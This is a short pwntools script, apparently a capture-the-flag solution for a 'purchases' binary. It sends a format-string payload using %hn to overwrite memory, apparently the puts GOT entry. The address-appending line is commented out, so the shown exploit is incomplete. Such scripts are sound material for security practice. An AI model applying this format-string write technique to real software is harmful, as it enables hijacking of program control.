from pwn import *

elf = ELF("./purchases")
sock = process("./purchases")
#sock = Socket("shell.actf.co", 19011)

sock.recvuntil("What item would you like to purchase? ")

payload = flat("%{}c%{}$hn".format(0x11b6, 8 + 2))
payload += b'A' * (8 - (len(payload) % 8))
#payload += p64(elf.symbols["got.puts"])[:3]
sock.sendline(payload)

print sock.recvall(1)
